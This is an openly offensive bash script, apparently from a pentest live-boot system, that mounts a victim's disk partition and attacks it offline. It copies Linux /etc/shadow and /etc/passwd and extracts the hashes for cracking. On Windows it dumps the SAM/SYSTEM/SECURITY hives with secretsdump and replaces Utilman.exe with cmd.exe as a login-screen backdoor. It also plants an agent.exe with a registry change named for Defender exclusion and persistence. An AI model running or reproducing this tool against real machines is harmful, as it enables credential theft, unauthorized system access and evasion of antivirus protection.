#!/bin/bash
# os_killer.sh
# Created on: Sat 29 Jul 2023 08:18:34 PM CEST
#
#  ____   __  ____  __
# (  _ \ /. |(  _ \/  )
#  )___/(_  _))___/ )(
# (__)    (_)(__)  (__)
#
# Description:
#  A script that will let you take a partition mount it and do a few simple
#  attacks on it. For windows partitions it will dump the SAM database to the
#  tmp of the p3ng0s system and will also let you change cmd.exe to utilman.exe.
#  For linux it will allow you to have a copy of etc/shadow and etc/passwd on the
#  tmp of the p3ng0s system and will also allow you to chroot inside of  the system
#  for extra control ^^
# Usage:
#  This script is usually run by .bash_profile during the welcome page of p3ng0s
#  but can be run independantly.

PART=
LOOT_FOLDER=$([ -d /home/p4p1-live/loot ] && echo '/home/p4p1-live/loot' || echo '/tmp')

echo $LOOT_FOLDER

function banner() {
	echo -e "\e[31m               .-')            .-. .-')                                 ('-.  _  .-')   \e[0m"
	echo -e "\e[31m              ( OO ).          \\  ( OO )                              _(  OO)( \\( -O )  \e[0m"
	echo -e "\e[31m .-'),-----. (_)---\_)         ,--. ,--.  ,-.-')  ,--.      ,--.     (,------.,------.  \e[0m"
	echo -e "\e[31m( OO'  .-.  '/    _ |          |  .'   /  |  |OO) |  |.-')  |  |.-')  |  .---'|   /\`. ' \e[0m"
	echo -e "\e[31m/   |  | |  |\\  :\` \`.          |      /,  |  |  \\ |  | OO ) |  | OO ) |  |    |  /  | | \e[0m"
	echo -e "\e[31m\\_) |  |\|  | '..\`''.)  (\`-.   |     ' _) |  |(_/ |  |\`-' | |  |\`-' |(|  '--. |  |_.' | \e[0m"
	echo -e "\e[31m  \\ |  | |  |.-._)   \\ (OO  )_ |  .   \\  ,|  |_.'(|  '---.'(|  '---.' |  .--' |  .  '.' \e[0m"
	echo -e "\e[31m   \`'  '-'  '\\       /,------.)|  |\\   \\(_|  |    |      |  |      |  |  \`---.|  |\\  \\  \e[0m"
	echo -e "\e[31m     \`-----'  \`-----' \`------' \`--' '--'  \`--'    \`------'  \`------'  \`------'\`--' '--' \e[0m"
}
function leaver() {
    umount /mnt
    exit 0
}

function linux_hashcat_exp() {
    systemctl stop p3ng0s-cracker-watcher.path
    HASHES=$(grep -E '^\w+:\$[6y]\$' /mnt/etc/shadow | cut -d: -f2)
    [ ! -d $LOOT_FOLDER/hashcat ] && mkdir -p $LOOT_FOLDER/hashcat
    if grep -q '^\w+:\$y\$' /etc/shadow; then
        MODE="28000" # Yescrypt
    else
        MODE="1800"  # SHA-512
    fi
    echo $HASHES > $LOOT_FOLDER/hashcat/hash.$MODE
}

function linux_exp() {
    SEL=$(dialog --title "What are you looking for?" \
        --menu "...." 20 70 15 \
        1 "dump passwd & shadow" \
        2 "chroot :)" \
        3 "Dump the hashes to then hashcat them ^^" \
        4 "Leave script" \
        2>&1 >/dev/tty)
    [ $SEL = 1 ] && $(cp -r /mnt/etc/passwd $LOOT_FOLDER/passwd; cp -r /mnt/etc/shadow $LOOT_FOLDER/shadow)
    [ $SEL = 2 ] && chroot /mnt
    [ $SEL = 3 ] && linux_hashcat_exp
    [ $SEL = 4 ] && leave

    echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
    sleep 1
}

function windows_hashcat_exp() {
    systemctl stop p3ng0s-cracker-watcher.path
    [ ! -d $LOOT_FOLDER/hashcat ] && mkdir -p $LOOT_FOLDER/hashcat
    /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | grep -E '^[^:]+:[^:]+:[^:]+:([a-fA-F0-9]{32}):{3}$' | cut -d: -f4 > $LOOT_FOLDER/hashcat/hash.1000
}

function windows_exclusion_path_exp() {
    if [ ! -f /home/p4p1-live/loot/agent.exe ]; then
        echo -e "\e[1;31m[!]\e[m No agent.exe found at /home/p4p1-live/loot/agent.txt! Cannot proceed"
        return 1
    fi
    mkdir -p /mnt/Windows/Tasks/p3ng0s/
    cp /home/p4p1-live/loot/agent.exe /mnt/Windows/Tasks/p3ng0s/agent.exe
    hivexregedit --merge "/mnt/Windows/System32/config/SOFTWARE" /etc/p3ng0s/os_killer/defender_exclude_persistence.reg

}

function windows_exp() {
    SEL=$(dialog --title "What are you looking for?" \
        --menu "...." 20 70 15 \
        1 "Dump SAM/SYSTEM/SECURITY/SOFTWARE ^^" \
        2 "Swap cmd.exe and utilman.exe" \
        3 "Secrets dump me baby right now" \
        4 "Dump the hashes to then hashcat them ^^" \
        5 "Leave script" \
        2>&1 >/dev/tty)
    [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY; cp -r /mnt/Windows/System32/config/SOFTWARE $LOOT_FOLDER/SOFTWARE)
    [ $SEL = 2 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
    [ $SEL = 3 ] && /opt/pentest/impacket/bin/secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log
    [ $SEL = 4 ] && windows_exp
    [ $SEL = 5 ] && leave

    echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
    sleep 1
}

function select_os() {
    mount $PART /mnt
    [ $? -ne 0 ] && $(sleep 4;exit -1)
    OS_SEL=$(dialog --title "Select a operating system" \
        --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
        1 "Windows" \
        2 "Linux" \
        2>&1 >/dev/tty)
    while [ True ]; do
        [ $OS_SEL = 1 ] && windows_exp
        [ $OS_SEL = 2 ] && linux_exp
    done
}

function list_hard_drives() {
    partitions=$(lsblk -npo NAME,SIZE --sort SIZE | tac)
    partition_options=()
    while read -r name size; do
        partition_options+=( "$name" "$name ($size)" )
    done <<< "$partitions"
    selected_partition=$(dialog --title "Select a Partition" \
                                 --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
                                 "${partition_options[@]}" \
                                 2>&1 >/dev/tty)
    if [[ -z "$selected_partition" ]]; then
        echo -e "\e[1;31m[!]\e[m No partition selected. Exiting.. ^^"
        exit 0
    fi
    PART=$selected_partition
}

if [ "$EUID" -ne 0 ]; then
    banner
    echo -e "\e[1;31m[!]\e[m Please enter the root password (default: p4p1)"
    exec sudo bash "$0" "$@"
else
    export DIALOGRC="/etc/p3ng0s/dialogrc"
    list_hard_drives
    select_os
fi

echo -e "\e[1;32m[*]\e[m you will now be booting in the gui environement if run at startup ^^"
sleep 5
exit
